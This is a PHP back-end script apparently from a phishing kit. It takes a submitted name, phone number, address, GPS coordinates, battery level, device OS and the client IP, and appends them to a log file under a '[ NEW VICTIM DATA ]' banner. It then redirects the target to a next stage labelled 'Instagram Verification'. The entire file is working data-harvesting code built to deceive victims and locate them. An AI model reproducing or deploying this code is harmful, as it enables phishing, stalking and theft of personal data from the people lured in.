<?php
// 1. Helper function to get the real IP address
function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_REMOTE_ADDR']))
        $ipaddress = $_SERVER['HTTP_REMOTE_ADDR'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

// 2. Collect Data from POST
$name     = $_POST['name'] ?? 'N/A';
$phone    = $_POST['phone'] ?? 'N/A';
$address  = $_POST['address'] ?? 'N/A';
$lat      = $_POST['lat'] ?? '';
$lon      = $_POST['lon'] ?? '';
$battery  = $_POST['battery'] ?? 'Unknown';
$os       = $_POST['os'] ?? 'Unknown';
$ip       = get_client_ip();
$time     = date("Y-m-d H:i:s");

// 3. Generate Functional Google Maps Link
if (!empty($lat) && !empty($lon)) {
    $gmaps_link = "https://www.google.com/maps?q=$lat,$lon";
} else {
    $gmaps_link = "Permission Denied / Not Shared";
}

// 4. Format the Log Entry (Pro Terminal Aesthetic)
$log_entry = "╔════════════════ [ NEW VICTIM DATA ] ════════════════╗\n";
$log_entry .= "║ Time     : $time\n";
$log_entry .= "║ IP       : $ip\n";
$log_entry .= "╟──────────────────────────────────────────────────────\n";
$log_entry .= "║ Name     : $name\n";
$log_entry .= "║ Phone    : $phone\n";
$log_entry .= "║ Address  : $address\n";
$log_entry .= "╟──────────────────────────────────────────────────────\n";
$log_entry .= "║ Device   : $os\n";
$log_entry .= "║ Battery  : $battery\n";
$log_entry .= "║ Location : $gmaps_link\n";
$log_entry .= "╚══════════════════════════════════════════════════════╝\n\n";

// 5. Ensure the log directory exists
$log_dir = "../../logs";
if (!is_dir($log_dir)) {
    mkdir($log_dir, 0777, true);
}

// 6. Save to output.txt
file_put_contents("$log_dir/output.txt", $log_entry, FILE_APPEND | LOCK_EX);

// 7. Redirect to the next stage (Instagram Verification)
header("Location: ../insta/index.php"); 
exit();
?>